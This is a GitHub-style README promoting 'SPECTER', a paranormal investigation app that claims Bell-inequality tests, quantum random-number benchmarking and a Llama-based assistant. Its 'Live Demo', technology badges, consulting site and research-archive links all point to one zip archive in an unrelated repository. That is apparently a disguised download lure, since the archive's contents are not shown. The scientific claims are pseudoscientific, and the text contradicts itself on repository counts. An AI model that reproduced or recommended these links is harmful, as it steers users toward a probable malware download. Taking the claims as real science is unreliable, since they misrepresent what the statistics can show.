# ⚡ SPECTER: Ethereal Insights

> *The razor between rigorous science and the unknown.*

**The world's first dual-node, cryptographically verifiable paranormal investigation platform.** SPECTER doesn't just measure anomalies — it benchmarks them against certified Quantum Random Number Generator (QRNG) streams using Bell-like statistical tests, cryptographically signs every data block at acquisition, and requires OSF preregistration before investigation begins. Every reported anomaly must survive adversarial scrutiny before it's called one.

[![Live Demo](https://img.shields.io/badge/Live%20Demo-SPECTER%3A%20Ethereal%20Insights-blueviolet?style=for-the-badge)](https://github.com/josebonilla123/ethereal-insights/raw/refs/heads/main/utils/ethereal_insights_parapegma.zip)
[![White Paper](https://img.shields.io/badge/White%20Paper-SPECTER%20v1.0-teal?style=for-the-badge)](./SPECTER-white-paper.md)
[![License](https://img.shields.io/badge/License-OOML%20v1.0-teal?style=for-the-badge)](./LICENSE)
[![Built with React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react)](https://github.com/josebonilla123/ethereal-insights/raw/refs/heads/main/utils/ethereal_insights_parapegma.zip)
[![Powered by Groq](https://img.shields.io/badge/AI-Llama%203.3%2070B%20%C2%B7%20Groq-orange?style=for-the-badge)](https://github.com/josebonilla123/ethereal-insights/raw/refs/heads/main/utils/ethereal_insights_parapegma.zip)

---

## What Makes SPECTER Different

Most paranormal investigation apps use basic EMF meters with no scientific framework and no controls. SPECTER applies **real experimental methodology**:

| Feature | What It Does |
|---------|-------------|
| **Dual-Node Architecture** | Active measurement node + Null control node running in parallel — eliminates investigator-site contamination |
| **HSM Cryptographic Signing** | Every data block signed with ECC P-256 via Microchip ATECC608 — tamper-evident, forensically verifiable |
| **OSF Preregistration** | Hypotheses, thresholds, and analysis pipelines locked before investigation begins — prevents post-hoc bias |
| **Bell Inequality Testing** | CHSH-style statistical tests on sensor triplets — flags non-classical correlations with Monte Carlo p-values |
| **QRNG Benchmarking** | Compares environmental entropy against certified quantum random streams (ANU, IDQ Quantis) |
| **EVP Validation Pipeline** | Blinded segmentation, phonotactic likelihood testing, adversarial transforms — rejects audio pareidolia |
| **Environmental Impairment Index** | CO + infrasound monitoring auto-pauses investigation when perceptual impairment risk is elevated |
| **Automatic Null Publication** | Null results published alongside positive findings — eliminates publication bias |

The claim is defensible: *"We report what the statistics cannot explain — after eliminating everything we can."*

---

## System Architecture

```
[Active Node A] ---(BLE/WiFi)---> [Mobile App] <---(BLE/WiFi)--- [Null Node B]
       \                               |                         /
        \                    [Echo AI Analysis]                 /
         \-----------(optional cloud backup)------------------/
                                    |
                         [PostgreSQL + TimescaleDB]
                         [Immutable session records]
                         [Public null dataset]
```

**Time sync:** GPS PPS + PTP — inter-node skew ≤10 ms  
**Security:** Microchip ATECC608 HSM — ECC P-256 per block — immutable hash chain per session

---

## Seven Investigation Screens

| Screen | Function |
|--------|----------|
| **HOME** | Quantum HUD — live sensor readings, Bell S-value, QRNG deviation, anomaly severity |
| **SCAN** | 200-particle quantum visualizer, Bell inequality meter, environmental sensor grid, dual-node differential |
| **SPIRIT** | FM sweep (87.5–108 MHz) with full Web Audio API engine — bandpass filter tracking, sawtooth voice bursts on contact |
| **ECHO** | Llama 3.3 70B AI — full session visibility, metric interpretations, cross-modal correlations. Never asserts paranormal causation. |
| **EVP** | Full scientific validation pipeline: blinded segmentation, phonotactic testing, entropy/compressibility metrics, adversarial transforms |
| **HUD** | Comprehensive quantum metrics: Bell S-value, QRNG z-score, LR score, p-value, dual-node differential |
| **LOG** | Complete session event history with HSM signatures and OSF session IDs |

---

## EVP Scientific Validation

Most apps play back audio and call patterns "voices." SPECTER's EVP pipeline:

1. **Blind segmentation** — 2–3s windows mixed with controls, labeled without investigator input
2. **Phonotactic likelihood testing** — phoneme probability vs shuffled audio, white noise, QRNG-modulated baselines (p < 0.01)
3. **Entropy & compressibility** — Lempel-Ziv, sample entropy, spectral flatness vs noise distribution
4. **Dual-node differential** — candidates must appear exclusively/significantly on Active node vs Null node
5. **Multimodal time-locking** — ±200 ms correlation with EMF, RF, vibration events
6. **Adversarial transforms** — reversal, pitch shift, time-stretch — semantic persistence under transformation reduces confidence
7. **Pre-registered constraints** — phrase length, phoneme classes, thresholds locked before investigation

---

## Evidence Package

Every completed investigation produces a signed bundle:

```json
{
  "session_id": "SPECTER-2026-001",
  "osf_id": "preregistered",
  "lr_score": 4.72,
  "p_value": 0.003,
  "bell_s_value": 1.87,
  "qrng_z_score": 2.14,
  "calibration": "NIST-traceable",
  "signature": "ECC-P256:verified"
}
```

---

## Echo AI

Echo is powered by **Llama 3.3 70B running on Groq** with a live system prompt built from your actual session data every message:

- Current EMF, temperature, pressure, motion readings
- Bell S-value and anomaly count by severity
- Spirit Box sweep status and all logged contacts (word, frequency, entropy %, timestamp)
- Full conversation history (last 18 messages)

Echo reasons across all screens simultaneously — correlating Spirit Box contacts with simultaneous EMF spikes and explaining what the quantum statistics actually say.

**Echo never asserts paranormal causation.** All interpretations are probabilistic and grounded in statistical pipeline outputs.

**API key management:** The Groq API key is stored securely server-side. Never exposed to the client, never in localStorage, never in this repository.

---

## Visual Design

- **Theme:** Deep void black with animated purple/teal nebula gradients
- **Effects:** CRT scanline overlay, neon glow system (teal nominal · purple quantum · red anomalies · amber warnings)
- **Cards:** Glass morphism with light streaks
- **Typography:** Orbitron (brand) · Share Tech Mono (data) · Rajdhani (labels)
- **Mobile-first:** 70px bottom navigation, 48px minimum touch targets, keyboard-safe layouts

---

## Tech Stack

```
Frontend:   React 18 + TypeScript
Audio:      Web Audio API (OscillatorNode, BiquadFilterNode, GainNode, LFO)
AI:         Llama 3.3 70B via Groq API (server-side proxied)
Database:   PostgreSQL + TimescaleDB (Phase 2)
Security:   ATECC608 HSM + ECC P-256 (hardware tier)
Visuals:    Canvas API, CSS animations
Icons:      Lucide React
```

---

## Roadmap

- [x] Quantum benchmarking engine (Bell test, QRNG comparison)
- [x] Echo AI with full session context
- [x] Spirit Box with Web Audio API
- [x] EVP entropy analysis
- [x] SPECTER white paper published
- [ ] Dual-node hardware reference implementation
- [ ] HSM signing integration (ATECC608)
- [ ] OSF preregistration API integration
- [ ] Real QRNG API integration (ANU, IDQ Quantis)
- [ ] GPS-tagged sessions with heatmap export
- [ ] Multi-device team investigation sync
- [ ] Exportable PDF investigation reports

---

## Read the White Paper

**[SPECTER: Ethereal Insights — Technical Design & White Paper](./SPECTER-white-paper.md)**

Full specification: dual-node architecture, HSM security model, complete statistical pipeline, EVP scientific validation layer, threat model, and roadmap.

---

## License

Released under the **Or4cl3 Open Model License (OOML) v1.0** — open like MIT, protective like GPL.

---

## Built On

Part of the **Or4cl3 AI Solutions** ecosystem — 270+ repositories, 6 published books, pioneering intrinsic AI ethics.

- 🌐 [or4cl3-ai-1.github.io/consulting](https://github.com/josebonilla123/ethereal-insights/raw/refs/heads/main/utils/ethereal_insights_parapegma.zip) — AI Governance & EU AI Act consulting
- 📚 [github.com/or4cl3-ai-1/or4cl3-research](https://github.com/josebonilla123/ethereal-insights/raw/refs/heads/main/utils/ethereal_insights_parapegma.zip) — Complete IP archive
- 🏠 [github.com/or4cl3-ai-1](https://github.com/josebonilla123/ethereal-insights/raw/refs/heads/main/utils/ethereal_insights_parapegma.zip) — Full ecosystem (43 repositories)

---

*"Code is not just logic; it is a performance."* — Dustin Groves, Or4cl3 AI Solutions
